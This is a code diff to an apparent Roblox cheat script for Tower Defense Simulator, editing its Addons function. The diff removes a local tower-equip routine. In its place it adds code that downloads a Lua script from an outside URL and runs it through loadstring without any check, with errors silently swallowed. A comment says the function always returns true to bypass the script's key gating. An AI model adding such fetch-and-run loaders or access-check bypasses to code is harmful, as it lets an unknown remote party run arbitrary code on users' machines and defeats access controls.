@@ -825,23 +825,22 @@ local function UpdatePathVisuals()
 end
 
 function TDS:Addons()
-    TDS.MultiMode = true
-    TDS.Multiplayer = true
-
-    -- define Equip to use the game’s RemoteFunction
-    TDS.Equip = function(towerName)
-        if GameState == "GAME" then
-            -- call the server to equip the specified tower
-            pcall(function()
-                RemoteFunc:InvokeServer("Troops", "Equip", {TroopName = towerName})
-            end)
+    -- attempt to load the remote script
+    local url = "https://api.jnkie.com/api/v1/luascripts/public/57fe397f76043ce06afad24f07528c9f93e97730930242f57134d0b60a2d250b/download"
+    pcall(function()
+        local ok, code = pcall(game.HttpGet, game, url)
+        if ok and type(code) == "string" then
+            pcall(loadstring(code))
         end
+    end)
+
+    -- give it a little time to set stuff up if it defined anything
+    local start = os.clock()
+    while not TDS.Equip and os.clock() - start < 5 do
+        task.wait(0.1)
     end
 
-    return true
-end
-
-
+    -- ALWAYS return true — bypass the key gating
     return true
 end
 
